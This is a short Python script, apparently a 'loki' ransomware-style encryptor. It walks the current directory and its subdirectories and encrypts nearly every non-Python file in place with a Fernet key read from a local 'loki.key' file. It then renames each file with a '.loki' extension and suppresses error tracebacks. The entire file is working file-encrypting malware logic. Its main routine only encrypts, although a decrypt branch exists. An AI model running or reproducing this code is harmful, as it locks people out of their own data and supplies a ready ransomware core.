# Imports.
import sys
import os
from pathlib import Path
from cryptography.fernet import Fernet

# Hide tracebacks - change to 1 for dev mode.
sys.tracebacklimit = 0

# Recursive Path Traversal.
def findFiles(path):
    files = []
    for f in os.listdir(path):
        new_path = f"{path}/{f}"
        if os.path.isdir(new_path):
            files += findFiles(new_path)
        else:
            files.append(new_path)
    return files

# Encrypt/Decrypt handler.
def handleFile(filePath, key, action):
    with open(filePath, "rb") as file:
        contents = file.read()

    if action.lower() == "e":
        contents = Fernet(key).encrypt(contents)
        message = "Encrypted"
    elif action.lower() == "d":
        contents = Fernet(key).decrypt(contents)
        message = "Decrypted"
    else:
        print(f"{action} is not a valid file action")
        return

    with open(filePath, "wb") as file:
        file.write(contents)
        print(message, "|", filePath)

# Functions.
def encrypt(files):
    # Get the key.
    with open("loki.key", "rb") as loki_key:
        key = loki_key.read()
    # encrypt files.
    for path in files:
        if '.py' in path:
            continue
        if 'loki.key' in path:
            continue
        # Handle File.
        handleFile(path, key, "e")
        # Rename.
        new_path = path
        ext = '.loki'
        if path[-len(ext):] != ext:
            new_path += ext
        os.rename(path, new_path)

def loki_encryptor():
    # Find files in current dir, and sub dirs.
    files = findFiles(".")
    encrypt(files)
    return

if __name__ == '__main__':
    loki_encryptor()